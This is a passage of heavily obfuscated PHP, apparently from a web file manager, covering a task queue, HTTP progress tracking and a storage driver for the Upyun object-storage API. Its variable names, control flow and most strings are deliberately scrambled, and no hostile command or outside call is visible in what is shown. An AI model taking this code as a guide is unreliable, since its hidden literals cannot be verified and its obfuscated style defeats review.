$CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1609]] = $cÃ§»«Á‘Á[107]; if ($CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1607]]) { $CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1608]] = $A Û˜…»´Ê; } if ($CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1610]]) { $CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1608]] = $A Û˜…»´Ê + $CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1610]]; } } else { if ($D¨ê„ê† > 0) { if ($CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1607]] == $d„åæ·œçœ) { $CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1608]] = $D¨ê„ê†; $CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1058]] = $cÃ§»«Á‘Á[1627]; $CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1609]] = $cÃ§»«Á‘Á[1128]; } } } $this->update(); } public function curlProgressStart($B¯Ÿ”Äâ‘ì) { } public function curlProgressEnd($B¹¾‹ğ“å¥) { goto CÙ¥ø©Ö”; céĞã…¤Øº: $this->update(); goto bƒ‹ï‚Æ–¸; a¬œ´…ö±Ÿ: $Fğô–—…³„ = $bçô ºè¡˜[$B›İ‘ÓÎä[1628]]; if ($Fğô–—…³„ == -1) { $Fğô–—…³„ = $bçô ºè¡˜[$B›İ‘ÓÎä[1629]]; } if ($D‚ƒ™™»õ°[$B›İ‘ÓÎä[1609]] == $B›İ‘ÓÎä[107] && $Fğô–—…³„) { $D‚ƒ™™»õ°[$B›İ‘ÓÎä[1610]] += $Fğô–—…³„; } goto céĞã…¤Øº; CÙ¥ø©Ö”: $B›İ‘ÓÎä =& $_SERVER[Ö‘Øù]; $D‚ƒ™™»õ° =& $this->task; $bçô ºè¡˜ = curl_getinfo($B¹¾‹ğ“å¥); goto a¬œ´…ö±Ÿ; bƒ‹ï‚Æ–¸: } } class TaskHttp extends Task { protected function startAfter() { $C‘‡Ÿßº¸ =& $_SERVER[Ö‘Øù]; $d¶‰‹Ï»áà =& $this->task; $d¶‰‹Ï»áà[$C‘‡Ÿßº¸[1630]] = 1; Hook::bind($C‘‡Ÿßº¸[1599], array($this, $C‘‡Ÿßº¸[1631])); Hook::bind($C‘‡Ÿßº¸[1601], array($this, $C‘‡Ÿßº¸[1632])); Hook::bind($C‘‡Ÿßº¸[1603], array($this, $C‘‡Ÿßº¸[1633])); } protected function endAfter() { $d°·•àßã‡ =& $_SERVER[Ö‘Øù]; Hook::unbind($d°·•àßã‡[1599], array($this, $d°·•àßã‡[1631])); Hook::unbind($d°·•àßã‡[1601], array($this, $d°·•àßã‡[1632])); Hook::unbind($d°·•àßã‡[1603], array($this, $d°·•àßã‡[1633])); } public function progressStart($f…Šª§Êæ) { $F¹±ã‚ÍÛ« =& $_SERVER[Ö‘Øù]; $Bİ†ª¤Ú‹¶ = curl_getinfo($f…Šª§Êæ); self::log($F¹±ã‚ÍÛ«[1634] . $Bİ†ª¤Ú‹¶[$F¹±ã‚ÍÛ«[305]]); self::valueSet($this->task[$F¹±ã‚ÍÛ«[395]], $this->task); } public function progressEnd($B×‘‰Éï«) { $f¡‰¢Ô•‹Ï =& $_SERVER[Ö‘Øù]; self::log($f¡‰¢Ô•‹Ï[1635] . $this->task[$f¡‰¢Ô•‹Ï[395]]); $this->end(); } public function progress($E±‚åÃ¼õó, $Aİô÷¶¢, $BÈ§’È‘Œ¯, $DîÅ‚ò‚“™, $BĞ‡Ï×) { $Cßµ×áèÛœ =& $_SERVER[Ö‘Øù]; $BÖ‰§çø‚  =& $this->task; if ($BĞ‡Ï× > 0) { $BÖ‰§çø‚ [$Cßµ×áèÛœ[1056]] = $BÖ‰§çø‚ [$Cßµ×áèÛœ[1056]] == 0 ? $DîÅ‚ò‚“™ : $BÖ‰§çø‚ [$Cßµ×áèÛœ[1056]]; $BÖ‰§çø‚ [$Cßµ×áèÛœ[1070]] = $BĞ‡Ï×; } else { if ($BÈ§’È‘Œ¯ > 0) { $BÖ‰§çø‚ [$Cßµ×áèÛœ[1056]] = $BÖ‰§çø‚ [$Cßµ×áèÛœ[1056]] == 0 ? $Aİô÷¶¢ : $BÖ‰§çø‚ [$Cßµ×áèÛœ[1056]]; $BÖ‰§çø‚ [$Cßµ×áèÛœ[1070]] = $BÈ§’È‘Œ¯; } } $this->update(); self::log("\x70\x72\x6f\147\162\x65\163\x73\x48\164\x74\x70\x3a\x64\157\x77\x6e\72{$BÈ§’È‘Œ¯}\57{$Aİô÷¶¢}\x3b\x20\x75\160\154\x6f\x61\144\x3a{$BĞ‡Ï×}\x2f{$DîÅ‚ò‚“™}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\163\153\x51\165\145\x75\x65\114\x65\156\147\164\x68"; const QUEUE_DATA = "\x74\x61\x73\x6b\121\x75\x65\165\145\104\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($AöĞÚÉÆƒæ, $b‘¼±×Âøä = array(), $b©‡‡»ëë‰ = '', $cŸ¯‰‰ƒçƒ = '') { $e÷·„°Œö =& $_SERVER[Ö‘Øù]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($cŸ¯‰‰ƒçƒ && array_find_by_field(self::$listData, $e÷·„°Œö[93], $cŸ¯‰‰ƒçƒ)) { return !0; } self::$listData[] = array($e÷·„°Œö[262] => $AöĞÚÉÆƒæ, $e÷·„°Œö[1636] => $b‘¼±×Âøä, $e÷·„°Œö[446] => $b©‡‡»ëë‰, $e÷·„°Œö[93] => $cŸ¯‰‰ƒçƒ); return !0; } public static function addSubmit() { $C”Ôó‡ïé  =& $_SERVER[Ö‘Øù]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($C”Ôó‡ïé [1637] . json_encode_force(array_to_keyvalue(self::$listData, $C”Ôó‡ïé [33], $C”Ôó‡ïé [446])), $C”Ôó‡ïé [1638]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($a˜Û©ÙåÁÃ, $díœÁÜ õ„ = array(), $cÙ×š›³¨½ = '', $cïÓ£Å•ºÈ = '') { goto FåŸë¹Ô•Ú; bè•¿‹™ç: if ($cïÓ£Å•ºÈ && array_find_by_field($cİÀ¥”œô, $d¹æƒğÊˆ¹[93], $cïÓ£Å•ºÈ)) { return !0; } $cİÀ¥”œô[] = array($d¹æƒğÊˆ¹[262] => $a˜Û©ÙåÁÃ, $d¹æƒğÊˆ¹[1636] => $díœÁÜ õ„, $d¹æƒğÊˆ¹[446] => $cÙ×š›³¨½, $d¹æƒğÊˆ¹[93] => $cïÓ£Å•ºÈ); write_log($d¹æƒğÊˆ¹[1637] . $cÙ×š›³¨½, $d¹æƒğÊˆ¹[1638]); goto C†¬›ëÃÏÊ; C†¬›ëÃÏÊ: self::setAll($cİÀ¥”œô); return !0; goto b¹ÍŸğœ‹; FåŸë¹Ô•Ú: $d¹æƒğÊˆ¹ =& $_SERVER[Ö‘Øù]; if (self::count() >= self::MAX_LENGTH) { return !1; } $cİÀ¥”œô = self::getAll(); goto bè•¿‹™ç; b¹ÍŸğœ‹: } public static function run() { goto fò•Úå¦ˆ²; fò•Úå¦ˆ²: $dÃˆ“Äˆ =& $_SERVER[Ö‘Øù]; $A™š‰î³Œ¹ = self::getAll(); $E¢‡£‡£É = array_shift($A™š‰î³Œ¹); goto B¹Û«„“â§; DéÏï±±Ÿ: try { Hook::apply($E¢‡£‡£É[$dÃˆ“Äˆ[262]], $E¢‡£‡£É[$dÃˆ“Äˆ[1636]]); } catch (Exception $AÜƒËØ) { } $bÜçÅŒÔ¾¯ = number_format(timeFloat() - $E†ÈçÏ›·õ, 3) . $dÃˆ“Äˆ[1574]; write_log($dÃˆ“Äˆ[1639] . $E¢‡£‡£É[$dÃˆ“Äˆ[446]] . $dÃˆ“Äˆ[1640] . $bÜçÅŒÔ¾¯, $dÃˆ“Äˆ[1638]); goto D¿ƒâÁÖ¿; B¹Û«„“â§: if (!$E¢‡£‡£É) { return !1; } self::setAll($A™š‰î³Œ¹); $E†ÈçÏ›·õ = timeFloat(); goto DéÏï±±Ÿ; D¿ƒâÁÖ¿: return !0; goto aäƒóŸÅğç; aäƒóŸÅğç: } public static function count() { $e‹›³Ùé†µ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$e‹›³Ùé†µ) { return 0; } return intval($e‹›³Ùé†µ); } public static function getAll() { $bŠá˜Á = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$bŠá˜Á) { return array(); } return $bŠá˜Á; } public static function setAll($f†Ëá¸Ö¬ó) { $fî‹øÜŒŸ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($f†Ëá¸Ö¬ó), $fî‹øÜŒŸ); Cache::set(self::QUEUE_DATA, $f†Ëá¸Ö¬ó, $fî‹øÜŒŸ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto EÂ²…ÇÖ ; AïˆÆ¬¡‹Ğ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\x2f\57\166\60\x2e\141\x70\x69\56\165\x70\171\x75\x6e\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($aØç‰Çñ—‰) { parent::__construct(); $this->_init($aØç‰Çñ—‰); } public function _init($e…ÎÁºš) { $a°İğ¨ =& $_SERVER[Ö‘Øù]; foreach ($e…ÎÁºš as $b–š¦÷ÒÑ => $FğÇ†µÊÔ„) { if (isset($this->{$b–š¦÷ÒÑ})) { $this->{$b–š¦÷ÒÑ} = $FğÇ†µÊÔ„; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($a°İğ¨[1363] . LNG($a°İğ¨[1296])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($F’Ÿ¼İ¿Ï, $Cö¨’Ç½¡â = "\x47\x45\x54") { $C¢æßø†ƒË =& $_SERVER[Ö‘Øù]; $eæ±ö”‡ËÂ = gmdate($C¢æßø†ƒË[1329]); $EÀèö×·¾ = base64_encode(hash_hmac($C¢æßø†ƒË[1364], "{$Cö¨’Ç½¡â}\x26{$F’Ÿ¼İ¿Ï}\x26{$eæ±ö”‡ËÂ}", md5("{$this->userpass}"), !0)); $B˜“°„’ = array("\x41\x75\164\150\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e\72\x55\120\x59\x55\116\x20{$this->username}\x3a{$EÀèö×·¾}", "\x44\141\x74\145\x3a{$eæ±ö”‡ËÂ}"); return $B˜“°„’; } public function ussRequest($eˆßÊ…â×°, $d×§ïæÒÄ– = "\107\x45\124", $b§ôÑƒ¯Ùà = false, $c‹°‡ËŠÉ³ = false, $D´ Ö–ˆ†­ = false) { goto BåÆÈµ³â; BåÆÈµ³â: $f»Œ§ÉõÇ =& $_SERVER[Ö‘Øù]; $eˆßÊ…â×° = trim($eˆßÊ…â×°, $f»Œ§ÉõÇ[8]); $D´ø¼â©ò = "\57{$this->bucket}\x2f{$eˆßÊ…â×°}"; goto cÒ“¥ù¶Ì; cÒ“¥ù¶Ì: $f‘ÄÏæ âº = $this->ussHeaders($D´ø¼â©ò, $d×§ïæÒÄ–); if ($c‹°‡ËŠÉ³) { $f‘ÄÏæ âº = array_merge($f‘ÄÏæ âº, $c‹°‡ËŠÉ³); } $bäğâÌË†– = url_request($this->endpoint . $D´ø¼â©ò, $d×§ïæÒÄ–, $b§ôÑƒ¯Ùà, $f‘ÄÏæ âº, $D´ Ö–ˆ†­); goto aí×ó£…¨—; aí×ó£…¨—: if (!$bäğâÌË†–) { return array($f»Œ§ÉõÇ[1120] => !1, $f»Œ§ÉõÇ[1122] => $f»Œ§ÉõÇ[1365]); } if (strtolower($d×§ïæÒÄ–) == $f»Œ§ÉõÇ[190] || in_array($bäğâÌË†–[$f»Œ§ÉõÇ[1120]], array($f»Œ§ÉõÇ[1223], $f»Œ§ÉõÇ[1366]))) { $b§ôÑƒ¯Ùà = $bäğâÌË†–[$f»Œ§ÉõÇ[1367]]; } else { $b§ôÑƒ¯Ùà = json_decode($bäğâÌË†–[$f»Œ§ÉõÇ[1122]], !0); if (!$b§ôÑƒ¯Ùà) { $b§ôÑƒ¯Ùà = $bäğâÌË†–[$f»Œ§ÉõÇ[1122]]; } else { if (!$bäğâÌË†–[$f»Œ§ÉõÇ[743]] && isset($b§ôÑƒ¯Ùà[$f»Œ§ÉõÇ[1368]])) { $b§ôÑƒ¯Ùà = $b§ôÑƒ¯Ùà[$f»Œ§ÉõÇ[1368]]; } } } return array($f»Œ§ÉõÇ[1120] => $bäğâÌË†–[$f»Œ§ÉõÇ[743]], $f»Œ§ÉõÇ[1122] => $b§ôÑƒ¯Ùà); goto aá³‹Ä›¶; aá³‹Ä›¶: } public function mkfile($BëŒ®ÃÃ¬ñ, $aŞ¹²º†ñ† = '', $B÷ô ÌÅõ™ = REPEAT_RENAME) { if ($this->setContent($BëŒ®ÃÃ¬ñ, $aŞ¹²º†ñ†)) { return $this->getPathOuter($BëŒ®ÃÃ¬ñ); } return !1; } public function mkdir($Bì“©°ÜÄß, $DÅÔŸØÑ’õ = REPEAT_SKIP) { $B‘ƒì·¥Î =& $_SERVER[Ö‘Øù]; $f‹è¢ŞĞê£ = trim($Bì“©°ÜÄß, $B‘ƒì·¥Î[8]); if ($this->_isFolder($f‹è¢ŞĞê£)) { return $this->getPathOuter($f‹è¢ŞĞê£); } $d¦ÉˆŠ·¤Ö = array($B‘ƒì·¥Î[1369]); $Aåâñ•‡ø• = $this->ussRequest($f‹è¢ŞĞê£, $B‘ƒì·¥Î[224], !1, $d¦ÉˆŠ·¤Ö); return $Aåâñ•‡ø•[$B‘ƒì·¥Î[1120]] ? $this->getPathOuter($f‹è¢ŞĞê£) : !1; } public function copyFile($DËÇ¨÷î¼ô, $AèØœòàÎ¤) { $EĞ‚Ş¨‚Õñ =& $_SERVER[Ö‘Øù]; $F¶òÓ—³…æ = array($EĞ‚Ş¨‚Õñ[1370] . "\x2f{$this->bucket}\x2f{$DËÇ¨÷î¼ô}", $EĞ‚Ş¨‚Õñ[1371]); $dÄâ”–§‹ = $this->ussRequest($AèØœòàÎ¤, $EĞ‚Ş¨‚Õñ[226], !1, $F¶òÓ—³…æ); return $dÄâ”–§‹[$EĞ‚Ş¨‚Õñ[1120]] ? !0 : $this->getPathOuter($AèØœòàÎ¤); } public function moveFile($F›‚Ì£Šî, $D«¿å›‰¾) { $c…öÕÜ·é =& $_SERVER[Ö‘Øù]; $F¿åÓ…ªœ¶ = array($c…öÕÜ·é[1372] . "\x2f{$this->bucket}\57{$F›‚Ì£Šî}", $c…öÕÜ·é[1371]); $DÕî¼¯•ô… = $this->ussRequest($D«¿å›‰¾, $c…öÕÜ·é[226], !1, $F¿åÓ…ªœ¶); return $DÕî¼¯•ô…[$c…öÕÜ·é[1120]] ? !0 : $this->getPathOuter($D«¿å›‰¾); } public function delFile($bìéó«Âëç) { $bØ¼ÎÅ‘­Ê =& $_SERVER[Ö‘Øù]; $Cî¾Ó®„Ï¥ = $this->ussRequest($bìéó«Âëç, $bØ¼ÎÅ‘­Ê[1373]); return $Cî¾Ó®„Ï¥[$bØ¼ÎÅ‘­Ê[1120]] ? !0 : !1; } public function delFolder($fö™ËğÜŠ) { goto E¤‹·åØ«Ï; f…ĞåÔ¾‹É: $DÓ‚¤äî”Ï = $e‚ÆÚµ´Î„ = array(); $this->fileList($fö™ËğÜŠ, $DÓ‚¤äî”Ï, $e‚ÆÚµ´Î„, !0); $this->listItemCache = !0; goto dôª˜ô›œ‹; E¤‹·åØ«Ï: $FÍŠ§‹èœô =& $_SERVER[Ö‘Øù]; if (!$this->exist($fö™ËğÜŠ)) { return !0; } $this->listItemCache = !1; goto f…ĞåÔ¾‹É; dôª˜ô›œ‹: foreach ($e‚ÆÚµ´Î„ as $BÀºæ‘Ÿ…) { $CŒª“§¤è = $this->ussRequest($BÀºæ‘Ÿ…[$FÍŠ§‹èœô[28]], $FÍŠ§‹èœô[1373]); if (!$CŒª“§¤è[$FÍŠ§‹èœô[1120]]) { return !1; } } foreach ($DÓ‚¤äî”Ï as $A­•Òäö‡½) { $CŒª“§¤è = $this->ussRequest($A­•Òäö‡½, $FÍŠ§‹èœô[1373]); if (!$CŒª“§¤è[$FÍŠ§‹èœô[1120]]) { return !1; } } $CŒª“§¤è = $this->ussRequest($fö™ËğÜŠ, $FÍŠ§‹èœô[1373]); goto c²¿‘Óé¡Æ; c²¿‘Óé¡Æ: return $CŒª“§¤è[$FÍŠ§‹èœô[1120]]; goto f¬éÚ„õ±ë; f¬éÚ„õ±ë: } public function rename($D‘‚Ä˜±¢, $b‡Ë•¥ÈöÏ) { if ($this->isFile($D‘‚Ä˜±¢)) { $b‡Ë•¥ÈöÏ = get_path_father($D‘‚Ä˜±¢) . $b‡Ë•¥ÈöÏ; return $this->moveFile($D‘‚Ä˜±¢, $b‡Ë•¥ÈöÏ); } return $this->renameObject($D‘‚Ä˜±¢, $b‡Ë•¥ÈöÏ); } public function fileInfo($d·½í¨ù, $BœÍ„„÷† = false, $CÑ¶¨ò“¯ = array()) { goto fàŸ”•äâ‹; fàŸ”•äâ‹: $dîçù†â‘± =& $_SERVER[Ö‘Øù]; $E®©ª±ã = array($dîçù†â‘±[28] => $this->pathThis($d·½í¨ù), $dîçù†â‘±[76] => $this->getPathOuter($dîçù†â‘±[8] . $d·½í¨ù), $dîçù†â‘±[29] => $dîçù†â‘±[193], $dîçù†â‘±[78] => isset($CÑ¶¨ò“¯[$dîçù†â‘±[78]]) ? $CÑ¶¨ò“¯[$dîçù†â‘±[78]] : 0, $dîçù†â‘±[168] => $this->ext($d·½í¨ù)); if ($BœÍ„„÷†) { return $E®©ª±ã; } goto e‹¥¯Åøøƒ; A×ÕİÉÈÀÍ: $E®©ª±ã[$dîçù†â‘±[194]] = intval($CÑ¶¨ò“¯[$dîçù†â‘±[1374]]); $E®©ª±ã[$dîçù†â‘±[84]] = intval($CÑ¶¨ò“¯[$dîçù†â‘±[1375]]); $E®©ª±ã[$dîçù†â‘±[78]] = $CÑ¶¨ò“¯[$dîçù†â‘±[78]]; goto D«‚š©½–; e‹¥¯Åøøƒ: $E®©ª±ã[$dîçù†â‘±[194]] = $E®©ª±ã[$dîçù†â‘±[84]] = 0; $E®©ª±ã[$dîçù†â‘±[195]] = $E®©ª±ã[$dîçù†â‘±[196]] = !0; if (empty($CÑ¶¨ò“¯)) { $CÑ¶¨ò“¯ = $this->objectMeta($d·½í¨ù); if (!$CÑ¶¨ò“¯) { return $E®©ª±ã; } } goto A×ÕİÉÈÀÍ; D«‚š©½–: return $E®©ª±ã; goto añŒŠª´Ç; añŒŠª´Ç: } public function folderInfo($FÖ…˜ßÄÏ¡, $d¸ïÑÖ¤é³ = false) { goto e°µÊÓÇ—À; F®ÈôÅ‚ŒÄ: $dá˜×ºÀ´¾[$d‡öÊÃŸ—¸[194]] = intval($dÃòÜŒ×İÊ[$d‡öÊÃŸ—¸[1374]]); $dá˜×ºÀ´¾[$d‡öÊÃŸ—¸[84]] = intval($dÃòÜŒ×İÊ[$d‡öÊÃŸ—¸[1375]]); return $dá˜×ºÀ´¾; goto d¿©İˆ‚áÒ; e°µÊÓÇ—À: $d‡öÊÃŸ—¸ =& $_SERVER[Ö‘Øù]; $dá˜×ºÀ´¾ = array($d‡öÊÃŸ—¸[28] => $this->pathThis($FÖ…˜ßÄÏ¡), $d‡öÊÃŸ—¸[76] => $this->getPathOuter($d‡öÊÃŸ—¸[8] . $FÖ…˜ßÄÏ¡), $d‡öÊÃŸ—¸[29] => $d‡öÊÃŸ—¸[77]); if ($d¸ïÑÖ¤é³) { return $dá˜×ºÀ´¾; } goto Cˆ×‚ÊçÄ‹; Cˆ×‚ÊçÄ‹: $dá˜×ºÀ´¾[$d‡öÊÃŸ—¸[194]] = $dá˜×ºÀ´¾[$d‡öÊÃŸ—¸[84]] = 0; $dá˜×ºÀ´¾[$d‡öÊÃŸ—¸[195]] = $dá˜×ºÀ´¾[$d‡öÊÃŸ—¸[196]] = !0; if (empty($dÃòÜŒ×İÊ)) { $dÃòÜŒ×İÊ = $this->objectMeta($FÖ…˜ßÄÏ¡); if (!$dÃòÜŒ×İÊ) { return $dá˜×ºÀ´¾; } } goto F®ÈôÅ‚ŒÄ; d¿©İˆ‚áÒ: } private function listObjs($Fê¶ƒÎ«°, $E–œ’†´È‹ = 0, $EçÑ“µÈÙƒ = 1000) { $AÃ›‹ì¥Æ =& $_SERVER[Ö‘Øù]; $b®Ôê„òÁ = array($AÃ›‹ì¥Æ[1376], $AÃ›‹ì¥Æ[1377] . $EçÑ“µÈÙƒ); if ($E–œ’†´È‹) { $b®Ôê„òÁ[] = $AÃ›‹ì¥Æ[1378] . $E–œ’†´È‹; } $d‹‡çÈ°˜ = $this->ussRequest($Fê¶ƒÎ«°, $AÃ›‹ì¥Æ[228], !1, $b®Ôê„òÁ); return !$d‹‡çÈ°˜[$AÃ›‹ì¥Æ[1120]] ? !1 : $d‹‡çÈ°˜[$AÃ›‹ì¥Æ[1122]]; } private function fileList($C­²›õˆ•Õ, &$e½¥µöŞ’ä, &$AœäãÚ¼À, $BËÊóÔÑ‰• = false) { goto a¶²µÃ; a‰´·˜È¿: $a¼íó½¶‰È = rtrim($C­²›õˆ•Õ, $Eœ‹»ÉÛ§è[8]) . $Eœ‹»ÉÛ§è[8]; $c–òŠ¶–Æ¶ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $bĞ‘‰áˆº´ = $this->listObjs($C­²›õˆ•Õ, $AŸ„İÅä, $c¼ˆÜšŞ§÷); if (!$bĞ‘‰áˆº´) { return !1; } $AŸ„İÅä = isset($bĞ‘‰áˆº´[$Eœ‹»ÉÛ§è[1379]]) ? $bĞ‘‰áˆº´[$Eœ‹»ÉÛ§è[1379]] : $Eœ‹»ÉÛ§è[33]; $fŠ¹ù¶ÉÑ = isset($bĞ‘‰áˆº´[$Eœ‹»ÉÛ§è[1380]]) ? $bĞ‘‰áˆº´[$Eœ‹»ÉÛ§è[1380]] : array(); foreach ($fŠ¹ù¶ÉÑ as $aÀ’±Ë³ñ) { $f—çÒÔ©‘¿ = $aÀ’±Ë³ñ[$Eœ‹»ÉÛ§è[29]] == $Eœ‹»ÉÛ§è[77] ? !0 : !1; $FœŞ¸İ‰İÅ = ltrim($a¼íó½¶‰È . $aÀ’±Ë³ñ[$Eœ‹»ÉÛ§è[28]], $Eœ‹»ÉÛ§è[8]) . ($f—çÒÔ©‘¿ ? $Eœ‹»ÉÛ§è[8] : $Eœ‹»ÉÛ§è[33]); $CëÅ®ÏÒ–× = array($Eœ‹»ÉÛ§è[28] => $FœŞ¸İ‰İÅ, $Eœ‹»ÉÛ§è[29] => $f—çÒÔ©‘¿ ? $Eœ‹»ÉÛ§è[77] : $Eœ‹»ÉÛ§è[193], $Eœ‹»ÉÛ§è[78] => $aÀ’±Ë³ñ[$Eœ‹»ÉÛ§è[335]], $Eœ‹»ÉÛ§è[1375] => $aÀ’±Ë³ñ[$Eœ‹»ÉÛ§è[1381]]); if ($c–òŠ¶–Æ¶) { $this->cacheMethod($Eœ‹»ÉÛ§è[199], $FœŞ¸İ‰İÅ, $f—çÒÔ©‘¿); $this->cacheMethod($Eœ‹»ÉÛ§è[200], $FœŞ¸İ‰İÅ, $CëÅ®ÏÒ–×); } if ($f—çÒÔ©‘¿) { $e½¥µöŞ’ä[] = $FœŞ¸İ‰İÅ; if ($BËÊóÔÑ‰•) { $this->fileList($FœŞ¸İ‰İÅ, $e½¥µöŞ’ä, $AœäãÚ¼À, $BËÊóÔÑ‰•); } continue; } $AœäãÚ¼À[] = $CëÅ®ÏÒ–×; } if (count($fŠ¹ù¶ÉÑ) < $c¼ˆÜšŞ§÷) { break; } } goto e’×…È¨êä; a¶²µÃ: $Eœ‹»ÉÛ§è =& $_SERVER[Ö‘Øù]; $AŸ„İÅä = $Eœ‹»ÉÛ§è[33]; $c¼ˆÜšŞ§÷ = 1000; goto a‰´·˜È¿; e’×…È¨êä: if ($c–òŠ¶–Æ¶) { $this->cacheMethod($Eœ‹»ÉÛ§è[199], $C­²›õˆ•Õ, !0); } goto D…Ëç‹ö…è; D…Ëç‹ö…è: } public function listPath($A×ÆŒÉÜ”, $cáÉÕ×öä = false) { $dŞ¾ƒš¿­Ñ =& $_SERVER[Ö‘Øù]; $c½Ãøˆ‘³† = $c¿œåøÄ¯ = array(); $this->fileList($A×ÆŒÉÜ”, $c½Ãøˆ‘³†, $c¿œåøÄ¯); foreach ($c½Ãøˆ‘³† as $e«–Ó¨²¥ => $Aó®–æŠŒ) { $c½Ãøˆ‘³†[$e«–Ó¨²¥] = $this->folderInfo($Aó®–æŠŒ, $cáÉÕ×öä); } foreach ($c¿œåøÄ¯ as $e«–Ó¨²¥ => $Aó®–æŠŒ) { $c¿œåøÄ¯[$e«–Ó¨²¥] = $this->fileInfo($Aó®–æŠŒ[$dŞ¾ƒš¿­Ñ[28]], $cáÉÕ×öä, $Aó®–æŠŒ); } return array($dŞ¾ƒš¿­Ñ[75] => $c½Ãøˆ‘³†, $dŞ¾ƒš¿­Ñ[74] => $c¿œåøÄ¯); } public function has($CÉà©è÷µÓ, $c˜éÎÜ© = false, $BèíÇ÷—›™ = true) { goto f±¯Š’çšº; f±¯Š’çšº: $B ›‚Ï·È‘ =& $_SERVER[Ö‘Øù]; $C®–¯óîá = $B ›‚Ï·È‘[33]; $eòˆŒÆ—Û = 500; goto Eêˆ¥¸à—Õ; F¢ºéÃ„©¢: while (!0) { check_abort(); $dÂ²çâœì = $this->listObjs($CÉà©è÷µÓ, $C®–¯óîá, $eòˆŒÆ—Û); if (!$dÂ²çâœì) { return !1; } $C®–¯óîá = isset($dÂ²çâœì[$B ›‚Ï·È‘[1379]]) ? $dÂ²çâœì[$B ›‚Ï·È‘[1379]] : $B ›‚Ï·È‘[33]; $fîïö¹ŒÏ‚ = isset($dÂ²çâœì[$B ›‚Ï·È‘[1380]]) ? $dÂ²çâœì[$B ›‚Ï·È‘[1380]] : array(); if (empty($fîïö¹ŒÏ‚)) { break; } $bœ®©öÌ„ñ = array_filter($fîïö¹ŒÏ‚, function ($CÑ‰Â’Œ®ó) { $b®¾”À¾ïõ =& $_SERVER[Ö‘Øù]; return $CÑ‰Â’Œ®ó[$b®¾”À¾ïõ[29]] == $b®¾”À¾ïõ[77]; }); $eÒöÛ‡—° = count($fîïö¹ŒÏ‚); $bœ®©öÌ„ñ = count($bœ®©öÌ„ñ); $D’¼µ˜„ï = $eÒöÛ‡—° - $bœ®©öÌ„ñ; if ($c˜éÎÜ©) { $DÈ ôŸò…® += $bœ®©öÌ„ñ; $eÈÄ•¹¢šÊ += $D’¼µ˜„ï; if ($eÒöÛ‡—° < $eòˆŒÆ—Û) { break; } continue; } if ($BèíÇ÷—›™) { if ($D’¼µ˜„ï) { return !0; } } else { if ($bœ®©öÌ„ñ) { return !0; } } if ($eÒöÛ‡—° < $eòˆŒÆ—Û) { break; } } if ($c˜éÎÜ©) { return array($B ›‚Ï·È‘[203] => $eÈÄ•¹¢šÊ, $B ›‚Ï·È‘[204] => $DÈ ôŸò…®); } return !1; goto bîÀ¬²Éáô; Eêˆ¥¸à—Õ: $eÈÄ•¹¢šÊ = 0; $DÈ ôŸò…® = 0; $eƒ§…¢İ¶… = rtrim($CÉà©è÷µÓ, $B ›‚Ï·È‘[8]) . $B ›‚Ï·È‘[8]; goto F¢ºéÃ„©¢; bîÀ¬²Éáô: } public function listAll($cƒ¿¥†ğ¬†) { goto b÷©ùßô”ğ; f³ÙÛËéõà: return $this->listAllFiles($cƒ¿¥†ğ¬†, array_keys($aïïõºÛÒë), $aïïõºÛÒë); goto a–‚ÜÒ‡ßß; b÷©ùßô”ğ: $d¨¬²ƒˆ“£ =& $_SERVER[Ö‘Øù]; $cëŠ•»—¨Ò = $fĞãƒÓ—«Ğ = array(); $this->fileList($cƒ¿¥†ğ¬†, $cëŠ•»—¨Ò, $fĞãƒÓ—«Ğ, !0); goto D÷©Ï¢–; D÷©Ï¢–: $aïïõºÛÒë = array(); foreach ($fĞãƒÓ—«Ğ as $FôÅÙÎ«Â…) { $aïïõºÛÒë[$FôÅÙÎ«Â…[$d¨¬²ƒˆ“£[28]]] = $FôÅÙÎ«Â…[$d¨¬²ƒˆ“£[78]]; } foreach ($cëŠ•»—¨Ò as $FôÅÙÎ«Â…) { if (is_string($FôÅÙÎ«Â…)) { $aïïõºÛÒë[$FôÅÙÎ«Â…] = 0; } } goto f³ÙÛËéõà; a–‚ÜÒ‡ßß: } public function canRead($eİ°Ïóã™) { return $this->exist($eİ°Ïóã™) ? !0 : !1; } public function canWrite($aïÑ‡æ±´¦) { return $this->exist($aïÑ‡æ±´¦) ? !0 : !1; } public function getContent($aº¿ğêîªÁ) { return $this->fileSubstr($aº¿ğêîªÁ, 0, -1); } public function setContent($F²ŞÈ›Ã”‘, $aĞ·ÍÔº“æ = '') { $B‚åÃ¸‰ =& $_SERVER[Ö‘Øù]; if (!$aĞ·ÍÔº“æ) { $a”Ã°×‘Ñ = $this->ussRequest($F²ŞÈ›Ã”‘, $B‚åÃ¸‰[224]); return $a”Ã°×‘Ñ[$B‚åÃ¸‰[1120]]; } $Eà„Ç¤©„ = 